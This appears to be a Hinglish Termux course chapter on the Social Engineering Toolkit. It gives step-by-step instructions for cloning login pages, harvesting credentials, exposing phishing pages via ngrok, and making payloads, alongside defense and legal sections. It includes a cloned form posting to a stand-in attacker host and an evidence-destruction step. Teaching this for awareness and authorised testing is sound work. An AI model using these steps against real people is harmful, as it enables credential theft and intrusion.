# Chapter 37: Social Engineering Toolkit (SET)

> **Module:** 6 - Security Tools  
> **Chapter:** 37 of 61  
> **Duration:** 20-25 Minutes  
> **Difficulty:** ⭐⭐⭐ Advanced  

---

## 📋 Chapter Overview

| Section | Content |
|---------|---------|
| Video Script | Complete Hindi narration with timestamps |
| Technical Guide | SET fundamentals and attacks |
| Installation Guide | Step-by-step proot-distro setup |
| Commands Reference | All SET commands covered |
| Practice Exercises | Hands-on phishing labs |
| Troubleshooting | Common SET issues |
| Video Assets | Thumbnail, description, tags |

---

## 🎬 VIDEO SCRIPT (Complete Hindi Narration)

```
═══════════════════════════════════════════════════════════════════════════════
TERMUX FULL COURSE - CHAPTER 37
Title: Social Engineering Toolkit (SET) | Phishing Attacks | T3rmuxk1ng
Duration: 20-25 Minutes
═══════════════════════════════════════════════════════════════════════════════

[INTRO - 0:00 to 0:50]
─────────────────────────────────────────────────────────────────────────────

Namaskar Dosto! Welcome back to Termux Full Course by T3rmuxk1ng!

Aaj ka chapter bahut special hai - Social Engineering Toolkit, ya SET.

Ye tool hacking ka sabse powerful aur dangerous weapon hai - lekin ethical 
hackers ke liye ye ek testing weapon hai. SET ko "people hacking" ka 
tool kaha jaata hai.

Kyunki ye technical vulnerabilities nahi, human vulnerabilities ko target 
karta hai. Yaad rakhein - sabse bada security risk HUMAN hai, machine 
nahi.

Agar aap penetration tester banana chahte ho, security analyst, ya 
bug bounty hunter - SET aapke liye essential hai.

Is video mein hum cover karenge:
- Social Engineering fundamentals
- SET installation Termux mein
- Phishing attacks kaise kaam karte hain
- Fake login pages banana
- Credential harvesting
- Defense mechanisms
- Legal considerations

Play button dabaiye, video like karein, aur channel subscribe karein!

---

[SECTION 1: SOCIAL ENGINEERING FUNDAMENTALS - 0:50 to 4:00]
─────────────────────────────────────────────────────────────────────────────

Sabse pehle samjhein - Social Engineering kya hai?

Social Engineering ek aisi technique hai jisme attacker technical 
vulnerabilities ki jagah human psychology ko exploit karta hai.

Yaani - system hack nahi karna, insaan hack karna.

Real world example:
Aapke phone pe call aata hai - "Hello, main aapke bank se bol raha hoon.
Aapka account insecure hai, aapke card details verify karein."
Aap darr jaate ho, details de dete ho - GAME OVER!

Ye social engineering hai. Technical hack nahi, psychological manipulation hai.

┌─────────────────────────────────────────────────────────────────────────┐
│              SOCIAL ENGINEERING ATTACK TYPES                            │
├──────────────────────┬──────────────────────────────────────────────────┤
│ Type                 │ Description                                     │
├──────────────────────┼──────────────────────────────────────────────────┤
│ Phishing             │ Fake websites to steal credentials              │
│ Vishing              │ Voice phishing (phone calls)                    │
│ Smishing             │ SMS phishing                                    │
│ Spear Phishing       │ Targeted attack on specific person              │
│ Whaling              │ Attack on high-profile targets (CEO, etc.)      │
│ Pretexting           │ Creating fake scenario to get information       │
│ Baiting              │ Leaving infected USBs/files as bait             │
│ Tailgating           │ Physical access following authorized person     │
│ Quid Pro Quo         │ Offering something in exchange for info         │
│ Watering Hole        │ Infecting sites targets frequently visit        │
└──────────────────────┴──────────────────────────────────────────────────┘

Social Engineering kyun kaam karti hai?

Human psychology mein ye weaknesses hain:
1. Trust - Hum logon pe bharosa karte hain
2. Fear - Darr hume galat decisions lene par majboor karta hai
3. Urgency - Jaldi mein hum check nahi karte
4. Greed - Free cheezein hum attract karti hain
5. Helpfulness - Hum madad karna chahte hain
6. Authority - Hum authority figure ki baat maante hain

Attacker in weaknesses ko exploit karta hai.

---

[SECTION 2: SET INTRODUCTION - 4:00 to 6:00]
─────────────────────────────────────────────────────────────────────────────

Ab baat karte hain SET ki - Social Engineering Toolkit.

SET ek open-source framework hai jo TrustedSec (David Kennedy) ne develop 
kiya hai. Ye Python mein likha gaya hai aur Kali Linux ka part hai.

SET kya kya kar sakta hai?

✓ Phishing attacks (fake websites)
✓ Credential harvesting (password stealing)
✓ Website cloning
✓ Payload creation (malware)
✓ Email spoofing
✓ QR code attacks
✓ Wireless attacks (fake AP)
✓ SMS spoofing
✓ And much more...

Termux mein SET directly install nahi hota kyunki ye heavy dependencies 
chahta hai. Isliye hum proot-distro use karenge - Ubuntu ya Kali Linux 
environment Termux ke andar.

Ye advanced chapter hai - beginners ke liye thoda challenging ho sakta hai.
Lekin main step by step explain karunga.

---

[SECTION 3: SET INSTALLATION - 6:00 to 10:00]
─────────────────────────────────────────────────────────────────────────────

Chaliye SET install karte hain Termux mein. Ye process thoda lamba hai 
lekin ek baar setup ho gaya to permanent hai.

[STEP 1: Install proot-distro]

Pehle proot-distro install karein - ye Termux mein Linux distributions 
run karne ke liye chahiye:

    pkg install proot-distro -y

[STEP 2: Install Ubuntu]

Ab Ubuntu install karein:

    proot-distro install ubuntu

Ye download aur extract mein 5-10 minute lag sakta hai. Internet speed 
pe depend karta hai.

[STEP 3: Login to Ubuntu]

Installation ke baad Ubuntu mein login karein:

    proot-distro login ubuntu

Ab aap Ubuntu environment mein ho! Prompt change ho jaayega.

[STEP 4: Update Ubuntu]

Pehle Ubuntu ko update karein:

    apt update && apt upgrade -y

[STEP 5: Install SET Dependencies]

SET ke liye ye dependencies chahiye:

    apt install git python3 python3-pip python3-dev build-essential \
    libssl-dev libffi-dev libxml2-dev libxslt1-dev zlib1g-dev -y

[STEP 6: Clone SET Repository]

Ab SET ko GitHub se download karein:

    git clone https://github.com/trustedsec/social-engineer-toolkit.git

[STEP 7: Install SET]

SET directory mein jao aur install karein:

    cd social-engineer-toolkit
    pip3 install -r requirements.txt
    python3 setup.py install

[STEP 8: Run SET]

Finally, SET run karein:

    setoolkit

First run mein configuration setup hoga. Default options select karein.

---

[SECTION 4: SET MENU STRUCTURE - 10:00 to 12:00]
─────────────────────────────────────────────────────────────────────────────

SET run karne ke baad aapko main menu dikhega:

┌─────────────────────────────────────────────────────────────────────────┐
│                    SET MAIN MENU                                        │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1) Social-Engineering Attacks                                         │
│  2) Penetration Testing (Fast-Track)                                   │
│  3) Third Party Modules                                                │
│  4) Update the Social-Engineer Toolkit                                 │
│  5) Update SET configuration                                           │
│  6) Help, Credits, and About                                           │
│                                                                         │
│  99) Exit the Social-Engineer Toolkit                                  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

Option 1 - Social-Engineering Attacks - ye main hai. Isme:

┌─────────────────────────────────────────────────────────────────────────┐
│            SOCIAL-ENGINEERING ATTACKS MENU                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1) Spear-Phishing Attack Vectors                                      │
│  2) Website Attack Vectors                                             │
│  3) Infectious Media Generator                                         │
│  4) Create a Payload and Listener                                      │
│  5) Mass Mailer Attack                                                 │
│  6) Arduino-Based Attack Vector                                        │
│  7) Wireless Access Point Attack Vector                                │
│  8) QRCode Generator Attack Vector                                     │
│  9) Powershell Attack Vectors                                          │
│  10) SMS Spoofing Attack Vector                                        │
│  11) Third Party Modules                                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

Option 2 - Website Attack Vectors - ye phishing ke liye hai:

┌─────────────────────────────────────────────────────────────────────────┐
│              WEBSITE ATTACK VECTORS                                     │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1) Java Applet Attack Method                                          │
│  2) Metasploit Browser Exploit Method                                  │
│  3) Credential Harvester Attack Method                                 │
│  4) Tabnabbing Attack Method                                           │
│  5) Web Jacking Attack Method                                          │
│  6) Multi-Attack Web Method                                            │
│  7) HTA Attack Method                                                  │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

Aaj hum Credential Harvester Attack Method cover karenge jo sabse 
common aur useful hai.

---

[SECTION 5: CREDENTIAL HARVESTING ATTACK - 12:00 to 16:00]
─────────────────────────────────────────────────────────────────────────────

Ab main aapko Credential Harvesting attack demo karunga. Ye sirf 
educational purpose ke liye hai!

[STEP 1: Select Attack]

SET main menu se:
1) Social-Engineering Attacks → Enter
2) Website Attack Vectors → Enter
3) Credential Harvester Attack Method → Enter

[STEP 2: Select Web Template]

Ab aapko options milenge:

┌─────────────────────────────────────────────────────────────────────────┐
│          CREDENTIAL HARVESTER OPTIONS                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1) Web Templates                                                       │
│  2) Site Cloner                                                        │
│ 3) Custom Import                                                       │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

Option 1 - Web Templates: Pre-built fake pages (Google, Facebook, etc.)
Option 2 - Site Cloner: Kisi bhi website ka clone banata hai
Option 3 - Custom Import: Custom HTML page import karein

[DEMO: Using Web Templates]

Select Option 1 - Web Templates

Ab aapko template options milenge:
- Google
- Facebook
- Twitter
- Yahoo
- And more...

Mai example ke liye Google select karta hoon.

Post exploitation ke liye aap IP address ya interface select kar sakte ho.
Local network ke liye apna IP use karein.

Apna IP check karein:
    ifconfig
Ya
    ip addr

SET automatically web server start karega aur phishing page ready hoga!

Victim ko link dena hai. Link format:
http://YOUR_IP_ADDRESS/

Jab victim link open karega, unhe Google login page dikhega. Lekin wo 
fake hai! Jab wo credentials enter karega, SET unse capture karega.

[DEMO: Using Site Cloner]

Agar aap kisi specific website ka clone banana chahte ho:

Option 2 - Site Cloner select karein

SET poochega:
"Enter the url to clone:"

Example: https://twitter.com/login

SET us website ka exact clone ban dega!

Important: HTTPS sites ka clone banana thoda tricky ho sakta hai 
kyunki certificates verify hote hain.

---

[SECTION 6: UNDERSTANDING PHISHING MECHANICS - 16:00 to 18:00]
─────────────────────────────────────────────────────────────────────────────

Ab samjhein ki ye sab technically kaise kaam karta hai.

┌─────────────────────────────────────────────────────────────────────────┐
│              PHISHING ATTACK FLOW                                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   [Attacker]                    [Victim]                               │
│       │                            │                                    │
│       │  1. Create fake page       │                                    │
│       │  2. Host on web server     │                                    │
│       │  3. Send link ────────────>│                                    │
│       │                            │  4. Click link                     │
│       │                            │  5. Open fake page                 │
│       │                            │  6. Enter credentials              │
│       │<──────────────────────────│  7. Submit form                    │
│       │  8. Receive credentials    │                                    │
│       │                            │                                    │
└─────────────────────────────────────────────────────────────────────────┘

SET internally kya karta hai:

1. Apache/Python web server start karta hai
2. Fake HTML page serve karta hai
3. Form submissions capture karta hai
4. Credentials file mein save karta hai
5. Logs maintain karta hai

Credential file location:
/root/.set/reports/

Ya SET installation directory mein.

---

[SECTION 7: PAYLOAD CREATION - 18:00 to 20:00]
─────────────────────────────────────────────────────────────────────────────

SET mein payloads bhi create kar sakte ho. Payload = malicious code.

Menu structure:
1) Social-Engineering Attacks
4) Create a Payload and Listener

┌─────────────────────────────────────────────────────────────────────────┐
│              PAYLOAD OPTIONS                                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│  1) Shellcode execution (Alphanumeric)                                 │
│  2) Windows Reverse_TCP Shell                                          │
│  3) Windows Meterpreter Reverse_TCP                                    │
│  4) Windows Reverse VNC DLL                                            │
│  5) Windows Reverse TCP Shell (Embedded)                               │
│  ...                                                                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

⚠️ WARNING: Payloads create karna aur distribute karna ILLEGAL hai 
bina permission ke! Sirf lab environment mein test karein.

Payload types:
- Reverse Shell: Victim machine se attacker machine pe connection
- Bind Shell: Attacker connects to victim machine
- Meterpreter: Advanced Metasploit payload
- VNC: Remote desktop access

SET payload create karne ke baad usko listener bhi set up kar deta hai 
jo incoming connections accept karega.

---

[SECTION 8: DEFENSE AGAINST SE ATTACKS - 20:00 to 22:00]
─────────────────────────────────────────────────────────────────────────────

Ab baat karte hain defense ki - kaise apne aap ko protect karein.

┌─────────────────────────────────────────────────────────────────────────┐
│              DEFENSE STRATEGIES                                         │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│ 1. VERIFY SENDER                                                       │
│    - Email address check karein carefully                              │
│    - Display name vs actual email                                      │
│    - When in doubt, call the organization directly                     │
│                                                                         │
│ 2. CHECK URL CAREFULLY                                                 │
│    - Hover karke actual link dekhein                                    │
│    - Look for misspellings (g00gle vs google)                          │
│    - HTTPS does NOT mean legitimate!                                   │
│                                                                         │
│ 3. NEVER SHARE SENSITIVE INFO                                          │
│    - Banks NEVER ask for passwords via email/phone                     │
│    - OTP kisiko share nahi karna                                        │
│    - Password change links direct visit karein                         │
│                                                                         │
│ 4. USE 2FA/MFA                                                         │
│    - Two-Factor Authentication enable karein                           │
│    - Authenticator apps better than SMS                                │
│                                                                         │
│ 5. SECURITY AWARENESS                                                  │
│    - Regular training                                                  │
│    - Phishing simulations                                              │
│    - Stay updated on new attack techniques                             │
│                                                                         │
│ 6. TECHNICAL CONTROLS                                                  │
│    - Email filtering (SPF, DKIM, DMARC)                                │
│    - Web filtering                                                     │
│    - Endpoint protection                                               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘

Phishing email ke signs:
- Urgent language ("Act now!", "Your account will be closed!")
- Generic greetings ("Dear Customer")
- Spelling and grammar mistakes
- Suspicious attachments
- Too good to be true offers
- Request for sensitive information

---

[SECTION 9: LEGAL CONSIDERATIONS - 22:00 to 23:30]
─────────────────────────────────────────────────────────────────────────────

Ye section bahut important hai. Dhyan se suniye.

⚠️ LEGAL WARNING ⚠️

Social Engineering attacks ILLEGAL hain agar:
❌ Bina permission ke kisi pe attack karo
❌ Kisi ki credentials steal karo
❌ Kisi ki privacy violate karo
❌ Financial loss cause karo
❌ Data breach karo

Legal consequences:
- Computer Fraud and Abuse Act (USA)
- IT Act Section 66, 66A (India)
- GDPR violations (Europe)
- Criminal charges
- Heavy fines
- Imprisonment

LEGAL USE CASES:
✅ Authorized penetration testing
✅ Security awareness training
✅ Bug bounty programs
✅ Academic research
✅ Your own lab environment

WRITTEN PERMISSION REQUIREMENTS:
- Written authorization from organization
- Define scope clearly
- Document everything
- Report findings properly

Yaad rakhein: "With great power comes great responsibility"

Ethical hacker = Permission + Documentation + Responsible disclosure

---

[SECTION 10: ALTERNATIVE TOOLS - 23:30 to 25:00]
─────────────────────────────────────────────────────────────────────────────

SET ke alawa Termux mein aur bhi tools hain SE ke liye:

┌─────────────────────────────────────────────────────────────────────────┐
│              ALTERNATIVE PHISHING TOOLS                                 │
├──────────────────────┬──────────────────────────────────────────────────┤
│ Tool                 │ Description                                     │
├──────────────────────┼──────────────────────────────────────────────────┤
│ SocialFish           │ Simple phishing tool with templates             │
│ Zphisher             │ Beginner-friendly phishing toolkit              │
│ Shellphish           │ Multi-platform phishing tool                    │
│ Onex                 │ Tool installer with phishing tools              │
│ NGrok                │ Tunnel for localhost to internet                │
│ BlackEye             │ Simple credential harvester                     │
│ Evilginx2            │ Advanced MITM phishing proxy                    │
│ Gophish              │ Phishing framework for testing                  │
└──────────────────────┴──────────────────────────────────────────────────┘

Quick install example - Zphisher:

    pkg install git php curl -y
    git clone https://github.com/htr-tech/zphisher.git
    cd zphisher
    bash zphisher.sh

Ye tool easier hai beginners ke liye aur direct Termux mein kaam karta hai 
bina proot ke.

NGrok important hai kyunki local phishing page ko internet pe expose karta hai:

    pkg install ngrok
    ngrok http 8080

Ye aapko ek public URL dega jo aapke local server pe point karega.

---

[SUMMARY - 25:00 to 26:00]
─────────────────────────────────────────────────────────────────────────────

To dosto, Chapter 37 complete! Let's summarize:

✅ Social Engineering fundamentals - Human vulnerabilities
✅ SET installation via proot-distro Ubuntu
✅ SET menu structure aur options
✅ Credential harvesting attack demo
✅ Website cloning technique
✅ Payload creation overview
✅ Defense strategies
✅ Legal considerations
✅ Alternative tools

Important commands yaad rakhein:

┌─────────────────────────────────────────────────────────────────────────┐
│                    CHAPTER 37 - IMPORTANT COMMANDS                      │
├─────────────────────────────────────────────────────────────────────────┤
│ proot-distro install ubuntu    │ Install Ubuntu in Termux              │
│ proot-distro login ubuntu      │ Login to Ubuntu                       │
│ git clone [SET_REPO]           │ Download SET                          │
│ python3 setup.py install       │ Install SET                           │
│ setoolkit                      │ Launch SET                            │
│ ifconfig / ip addr             │ Check IP address                      │
│ ngrok http 8080                │ Expose local server to internet       │
└─────────────────────────────────────────────────────────────────────────┘

Next Chapter 38 mein hum WiFi Security Tools cover karenge - Aircrack-ng, 
Wifite, aur wireless penetration testing.

Agar ye video helpful lagi, to:
👍 Like button press karein
🔔 Subscribe karein, notification bell on karein
💬 Koi sawal ho to comment mein poochein
📤 Share karein friends ke saath

Main har comment ka reply karta hoon.

Thank you for watching! Stay ethical, stay safe!

═══════════════════════════════════════════════════════════════════════════════
```

---

## 📖 TECHNICAL GUIDE

### 1. Social Engineering Fundamentals

```
┌─────────────────────────────────────────────────────────────────────────┐
│              SOCIAL ENGINEERING LIFECYCLE                               │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐            │
│   │ RESEARCH │───>│  PLAN   │───>│ EXECUTE │───>│  EXIT   │            │
│   └─────────┘    └─────────┘    └─────────┘    └─────────┘            │
│       │              │              │              │                    │
│       ▼              ▼              ▼              ▼                    │
│   - OSINT        - Select       - Launch       - Cover tracks         │
│   - Target       method         attack         - Destroy evidence     │
│   - Gather       - Prepare      - Gather       - Document             │
│   info           resources      data           findings               │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
```

### 2. Attack Types Explained

| Attack Type | Description | Example |
|-------------|-------------|---------|
| **Phishing** | Fake websites/emails to steal credentials | Fake bank login page |
| **Spear Phishing** | Targeted phishing attack | Email to specific employee |
| **Whaling** | Attack on executives | Fake CEO email to CFO |
| **Vishing** | Voice phishing | Fake tech support call |
| **Smishing** | SMS phishing | Fake delivery SMS with link |
| **Pretexting** | Creating false scenario | Fake investigator story |
| **Baiting** | Physical media attack | Infected USB in parking lot |
| **Tailgating** | Physical access bypass | Following employee into building |
| **Quid Pro Quo** | Exchange for information | Fake IT support for password |

### 3. SET Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    SET ARCHITECTURE                                      │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│   ┌─────────────────────────────────────────────────────────────────┐   │
│   │                     SET Core (Python)                            │   │
│   │   - Attack modules                                                │   │
│   │   - Payload generators                                            │   │
│   │   - Web server management                                         │   │
│   └─────────────────────────────────────────────────────────────────┘   │
│                                   │                                      │
│              ┌────────────────────┼────────────────────┐                │
│              ▼                    ▼                    ▼                │
│   ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐        │
│   │  Web Server     │  │   Metasploit    │  │   Apache/SSL    │        │
│   │  (Python/HTTP)  │  │   Integration   │  │   Templates     │        │
│   └─────────────────┘  └─────────────────┘  └─────────────────┘        │
│                                                                          │
│              ┌────────────────────┼────────────────────┐                │
│              ▼                    ▼                    ▼                │
│   ┌─────────────────┐  ┌─────────────────┐  ┌─────────────────┐        │
│   │   Payloads      │  │   Email         │  │   Wireless      │        │
│   │   (MSFVenom)    │  │   (SMTP)        │  │   (Hostapd)     │        │
│   └─────────────────┘  └─────────────────┘  └─────────────────┘        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 4. SET Installation Details

#### System Requirements

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    REQUIREMENTS                                          │
├─────────────────────────────────────────────────────────────────────────┤
│ Operating System:  Ubuntu/Kali (via proot-distro)                       │
│ Python:           Python 3.6+                                           │
│ Storage:          2GB+ free space                                       │
│ RAM:              1GB+ recommended                                      │
│ Network:          Internet for installation, local network for attacks  │
│ Permissions:      No root required (proot)                              │
└─────────────────────────────────────────────────────────────────────────┘
```

#### Directory Structure

```
/social-engineer-toolkit/
├── setoolkit                 # Main executable
├── src/                      # Source code
│   ├── core/                 # Core functionality
│   ├── payloads/             # Payload modules
│   ├── phishing/             # Phishing modules
│   └── telemetry/            # Telemetry
├── config/                   # Configuration files
│   └── set_config.py         # Main config
├── reports/                  # Captured credentials
├── templates/                # Web templates
└── readme/                   # Documentation
```

### 5. Credential Harvesting Deep Dive

#### Attack Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│              CREDENTIAL HARVESTING FLOW                                  │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. Attacker starts SET and selects credential harvester                │
│     setoolkit → 1 → 2 → 3                                               │
│                                                                          │
│  2. Attacker selects/clones target website                              │
│     - Pre-built template (Google, Facebook, etc.)                       │
│     - Clone existing website                                            │
│     - Import custom HTML                                                │
│                                                                          │
│  3. SET starts web server on attacker machine                           │
│     - Default port: 80 or 443                                           │
│     - Binds to attacker's IP                                            │
│                                                                          │
│  4. Attacker sends link to victim                                       │
│     - Direct IP: http://192.168.1.100                                   │
│     - Via ngrok: https://abc123.ngrok.io                                │
│     - Via URL shortener                                                 │
│                                                                          │
│  5. Victim visits fake page                                             │
│     - Page looks identical to real site                                 │
│     - No obvious signs of phishing                                      │
│                                                                          │
│  6. Victim enters credentials                                           │
│     - Username/password submitted                                       │
│     - SET captures and stores                                           │
│                                                                          │
│  7. SET displays captured data                                          │
│     - Real-time output                                                  │
│     - Stored in reports/ directory                                      │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

#### Captured Data Format

```
[*] Credential harvest from: 192.168.1.50
[*] User Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
[*] Time: 2024-01-15 14:30:22

Username: victim@email.com
Password: MyP@ssw0rd123

[*] Captured data saved to: /root/.set/reports/credentials.txt
```

### 6. Website Cloning Technique

```
┌─────────────────────────────────────────────────────────────────────────┐
│              WEBSITE CLONING PROCESS                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Original Website: https://example.com/login                            │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ <form action="https://example.com/auth" method="POST">          │   │
│  │   <input type="text" name="username">                           │   │
│  │   <input type="password" name="password">                       │   │
│  │   <button type="submit">Login</button>                          │   │
│  │ </form>                                                         │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  SET Modified Version:                                                  │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ <form action="http://attacker-ip/harvest" method="POST">        │   │
│  │   <input type="text" name="username">                           │   │
│  │   <input type="password" name="password">                       │   │
│  │   <button type="submit">Login</button>                          │   │
│  │ </form>                                                         │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  Key Changes:                                                           │
│  - Form action changed to attacker's harvest endpoint                  │
│  - All resources loaded locally or proxied                             │
│  - JavaScript may be added for additional functionality                │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 7. Payload Types

```
┌─────────────────────────────────────────────────────────────────────────┐
│              PAYLOAD TYPES                                               │
├────────────────────────┬────────────────────────────────────────────────┤
│ Payload Type           │ Description                                   │
├────────────────────────┼────────────────────────────────────────────────┤
│ reverse_tcp            │ Victim connects back to attacker              │
│ reverse_https          │ Encrypted reverse connection                  │
│ reverse_http           │ HTTP-based reverse shell                      │
│ bind_tcp               │ Attacker connects to victim                   │
│ meterpreter            │ Advanced Metasploit payload                   │
│ shell_reverse_tcp      │ Basic reverse shell                           │
│ cmd/unix/reverse       │ Unix reverse shell                            │
│ dll injection          │ Windows DLL injection                         │
│ hta_server             │ HTML Application attack                       │
│ powershell             │ PowerShell-based payload                      │
└────────────────────────┴────────────────────────────────────────────────┘
```

### 8. QR Code Attacks

```
┌─────────────────────────────────────────────────────────────────────────┐
│              QR CODE ATTACK METHOD                                       │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  SET Menu: 1 → 8 (QRCode Generator Attack Vector)                       │
│                                                                          │
│  How it works:                                                          │
│  1. SET generates a QR code                                             │
│  2. QR code contains attacker's phishing URL                            │
│  3. Victim scans QR code with phone                                     │
│  4. Browser opens phishing page                                         │
│  5. Credentials harvested                                               │
│                                                                          │
│  Use cases:                                                             │
│  - Physical phishing (posters, flyers)                                  │
│  - Event badges                                                         │
│  - Restaurant menus (fake)                                              │
│  - Parking meters (fake)                                                │
│                                                                          │
│  QR Code Generation:                                                    │
│  ┌─────────────┐                                                        │
│  │ ▓▓░░▓▓░░▓▓ │  http://attacker-ip/                                   │
│  │ ░▓▓░░▓▓░▓▓ │  ↓                                                     │
│  │ ▓▓░▓▓░░▓▓░ │  Phishing Page                                         │
│  │ ░░▓▓░░▓▓░▓ │                                                        │
│  │ ▓░░▓▓░▓▓░░ │                                                        │
│  └─────────────┘                                                        │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 9. WiFi AP Attacks (Concept)

```
┌─────────────────────────────────────────────────────────────────────────┐
│              EVIL TWIN ATTACK                                            │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  SET Menu: 1 → 7 (Wireless Access Point Attack Vector)                  │
│                                                                          │
│  Attack Flow:                                                           │
│                                                                          │
│  ┌─────────────┐      ┌─────────────┐      ┌─────────────┐             │
│  │ Legitimate  │      │   Fake AP   │      │   Attacker  │             │
│  │   Router    │      │  (SET Tool) │      │   Machine   │             │
│  │ "HomeWiFi"  │      │  "HomeWiFi" │      │             │             │
│  └──────┬──────┘      └──────┬──────┘      └──────┬──────┘             │
│         │                    │                    │                     │
│         │  ┌─────────────────┴────────────────┐   │                     │
│         │  │         Victim connects          │   │                     │
│         │  │         to stronger signal       │   │                     │
│         │  └─────────────────┬────────────────┘   │                     │
│         │                    │                    │                     │
│         │                    │  ┌─────────────────┴────────────────┐    │
│         │                    │  │ All traffic routed through       │    │
│         │                    │  │ attacker (MITM)                  │    │
│         │                    │  └─────────────────┬────────────────┘    │
│         │                    │                    │                     │
│         │                    │  ┌─────────────────┴────────────────┐    │
│         │                    │  │ Victim sees captive portal        │    │
│         │                    │  │ Enters WiFi password             │    │
│         │                    │  └──────────────────────────────────┘    │
│                                                                          │
│  Requirements:                                                          │
│  - WiFi adapter (monitor mode capable)                                  │
│  - hostapd, dnsmasq                                                     │
│  - Root access (may not work in Termux proot)                           │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

### 10. Email Spoofing Concepts

```
┌─────────────────────────────────────────────────────────────────────────┐
│              EMAIL SPOOFING MECHANICS                                   │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  Normal Email Flow:                                                     │
│  sender@bank.com → SMTP Server → Recipient                             │
│                                                                          │
│  Spoofed Email Flow:                                                    │
│  attacker@evil.com → Compromised SMTP → Recipient                       │
│                    (Displays: security@bank.com)                        │
│                                                                          │
│  How it works:                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ FROM: security@bank.com (Display Name & Email)                  │   │
│  │ REPLY-TO: attacker@evil.com (Hidden)                            │   │
│  │ RETURN-PATH: attacker@evil.com (Hidden)                         │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
│  SET Email Spoofing Options:                                           │
│  - Set arbitrary FROM address                                          │
│  - Attach malicious files                                              │
│  - Include tracking pixels                                             │
│  - Create convincing templates                                         │
│                                                                          │
│  Defense (SPF/DKIM/DMARC):                                             │
│  ┌─────────────────────────────────────────────────────────────────┐   │
│  │ SPF (Sender Policy Framework):                                   │   │
│  │   - Defines which IPs can send for domain                        │   │
│  │   - v=spf1 include:_spf.google.com ~all                         │   │
│  │                                                                  │   │
│  │ DKIM (DomainKeys Identified Mail):                              │   │
│  │   - Cryptographic signature                                      │   │
│  │   - Verifies email integrity                                     │   │
│  │                                                                  │   │
│  │ DMARC (Domain-based Message Authentication):                    │   │
│  │   - Policy for handling failed SPF/DKIM                          │   │
│  │   - v=DMARC1; p=reject; rua=mailto:admin@domain.com             │   │
│  └─────────────────────────────────────────────────────────────────┘   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 🔧 INSTALLATION GUIDE

### Complete SET Installation in Termux

```bash
# STEP 1: Update Termux
pkg update && pkg upgrade -y

# STEP 2: Install proot-distro
pkg install proot-distro -y

# STEP 3: Install Ubuntu
proot-distro install ubuntu

# STEP 4: Login to Ubuntu
proot-distro login ubuntu

# STEP 5: Update Ubuntu
apt update && apt upgrade -y

# STEP 6: Install dependencies
apt install -y git python3 python3-pip python3-dev \
    build-essential libssl-dev libffi-dev \
    libxml2-dev libxslt1-dev zlib1g-dev \
    apache2 net-tools

# STEP 7: Clone SET repository
git clone https://github.com/trustedsec/social-engineer-toolkit.git

# STEP 8: Navigate to SET directory
cd social-engineer-toolkit

# STEP 9: Install Python requirements
pip3 install -r requirements.txt

# STEP 10: Install SET
python3 setup.py install

# STEP 11: Run SET
setoolkit
```

### Quick Alternative: Zphisher (Simpler Tool)

```bash
# Works directly in Termux without proot
pkg install git php curl -y

# Clone Zphisher
git clone --depth=1 https://github.com/htr-tech/zphisher.git

# Navigate and run
cd zphisher
bash zphisher.sh
```

### Setup NGrok for External Access

```bash
# Install ngrok
pkg install ngrok

# Sign up at ngrok.com and get auth token
ngrok config add-authtoken YOUR_AUTH_TOKEN

# Expose local web server
ngrok http 8080
```

---

## 📋 COMMANDS REFERENCE

### SET Navigation Commands

```bash
# Start SET
setoolkit

# Main Menu Options:
1  # Social-Engineering Attacks
2  # Penetration Testing (Fast-Track)
3  # Third Party Modules
4  # Update SET
5  # Update SET configuration
6  # Help, Credits, and About
99 # Exit

# Social-Engineering Attacks Submenu (Option 1):
1  # Spear-Phishing Attack Vectors
2  # Website Attack Vectors
3  # Infectious Media Generator
4  # Create a Payload and Listener
5  # Mass Mailer Attack
6  # Arduino-Based Attack Vector
7  # Wireless Access Point Attack Vector
8  # QRCode Generator Attack Vector
9  # Powershell Attack Vectors
10 # SMS Spoofing Attack Vector
11 # Third Party Modules

# Website Attack Vectors Submenu (Option 1 → 2):
1  # Java Applet Attack Method
2  # Metasploit Browser Exploit Method
3  # Credential Harvester Attack Method
4  # Tabnabbing Attack Method
5  # Web Jacking Attack Method
6  # Multi-Attack Web Method
7  # HTA Attack Method
```

